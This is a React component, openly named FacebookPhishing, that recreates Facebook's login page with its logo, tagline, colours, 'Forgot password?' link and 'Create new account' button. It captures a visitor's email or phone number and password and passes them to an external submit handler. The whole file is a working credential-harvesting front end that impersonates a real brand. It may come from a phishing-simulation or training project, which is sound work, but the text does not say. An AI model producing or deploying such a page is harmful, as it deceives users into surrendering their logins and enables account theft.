'use client';

export default function FacebookPhishing({ formData, handleChange, handleSubmit, loading }) {
  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-50 px-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-6">
          <svg className="mx-auto mb-4" width="300" height="80" viewBox="0 0 301 84">
            <text x="0" y="65" fontFamily="Helvetica, Arial, sans-serif" fontSize="68" fontWeight="bold" fill="#1877F2">
              facebook
            </text>
          </svg>
          <p className="text-lg text-gray-600 mb-8">
            Connect with friends and the world around you on Facebook.
          </p>
        </div>

        <div className="bg-white rounded-lg shadow-md p-6">
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              name="email"
              type="text"
              required
              value={formData.email || ''}
              onChange={handleChange}
              placeholder="Email address or phone number"
              className="w-full rounded-md border border-gray-300 px-4 py-3.5 text-base text-gray-900 placeholder-gray-500 bg-white focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
            <input
              name="password"
              type="password"
              required
              value={formData.password || ''}
              onChange={handleChange}
              placeholder="Password"
              className="w-full rounded-md border border-gray-300 px-4 py-3.5 text-base text-gray-900 placeholder-gray-500 bg-white focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-md bg-[#1877F2] py-3 text-xl font-bold text-white hover:bg-[#166FE5] disabled:opacity-50 transition"
            >
              {loading ? 'Logging in...' : 'Log In'}
            </button>
          </form>

          <div className="mt-4 text-center">
            <a href="#" className="text-[#1877F2] text-sm hover:underline">Forgot password?</a>
          </div>

          <div className="my-5 border-t border-gray-300"></div>

          <div className="text-center">
            <button
              type="button"
              className="rounded-md bg-[#42B72A] px-4 py-3 text-base font-bold text-white hover:bg-[#36A420] transition cursor-pointer"
            >
              Create new account
            </button>
          </div>
        </div>

        <div className="mt-6 text-center text-sm text-gray-600">
          <p>
            <span className="font-semibold">Create a Page</span> for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </div>
  );
}